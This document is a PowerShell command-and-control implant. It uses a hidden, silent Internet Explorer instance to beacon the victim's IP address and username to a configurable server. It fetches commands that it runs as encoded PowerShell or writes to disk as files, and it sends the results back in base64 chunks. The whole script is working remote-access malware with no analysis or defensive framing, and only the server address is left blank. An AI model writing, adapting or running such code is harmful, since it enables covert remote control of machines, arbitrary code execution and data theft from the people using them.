$srv = ''

# define session
$chunk_size = 2500 # 2.5 KB
$e = New-Object System.Text.ASCIIEncoding
$ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1}
$session = $ip.ipaddress[0] + '|' + $env:USERNAME

function run {
  param($ie)
  # 14 = no history, no read cache, no write cache
  $ie.navigate2($srv + '?TxR=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session)), 14, 0, $null, $null)
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
  if ($ie.document.firstchild.innertext -ne '0') {
    # DOWNLOAD COMMAND DATA
    $col = 3
    $buf = New-Object Collections.ArrayList
    $type = $ie.document.firstchild.innertext;
    while (1) {
      $ie.navigate2($srv + '?TxD=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session + '|' + $col)), 14, 0, $null, $null)
      while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
      if ($ie.document.firstchild.innertext -eq $null) {
        break;
      }
      $buf.add($ie.document.firstchild.innertext) | out-null
      $col++
    }
    # ACK COMPLETED DATA DOWNLOAD
    $ie.navigate2($srv + '?Tx=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session + '|2')), 14, 0, $e.GetBytes('d=0'), $null)
    while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
    # RUN COMMAND BASED ON TYPE
    if ($type -eq '@') {
      $xc = [String]::join('', $buf)
      $res = powershell.exe -nopr -noni -enc $xc
      if ($res -eq $null) {
        $res = 'NULL'
      } else {
        $res = $res | out-string
      }
    } else {
      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String([String]::join('', $buf)))
      $res = 'NULL'
    }
    # SEND COMMAND RESULT
    $col = 3
    $idx = 0
    while ($idx -le ($res.length - $chunk_size)) {
      $d = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res.substring($idx, $chunk_size)))
      $ie.navigate2($srv + '?Rx=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session + '|' + $col)), 14, 0, $e.GetBytes('d=' + $d), $null)
      while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
      $idx += $chunk_size
      $col++
    }
    $d = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res.substring($idx)))
    $ie.navigate2($srv + '?Rx=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session + '|' + $col)), 14, 0, $e.GetBytes('d=' + $d), $null)
    while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
    # ACK COMMAND RESULT DATA SENT
    $ie.navigate2($srv + '?Rx=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($session + '|2')), 14, 0, $e.GetBytes('d=1'), $null)
    while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1}
  }
}

# main program loop
while (1) {
  try {
    $ie = new-object -com internetexplorer.application
    $ie.visible = $false
    $ie.silent = $true
    while (1) {
      # run instance of C2
      run($ie)
      # generate traffic
      #$ie.navigate('https://www.google.com/maps/', 14)
      #$delay = Get-Random -InputObject 5, 10, 15
      sleep -seconds 5
      #$ie.stop()
    }
  } catch {
    # remove stranded IE processes
    taskkill.exe /f /im iexplore.exe
    write-host $_
  }
}
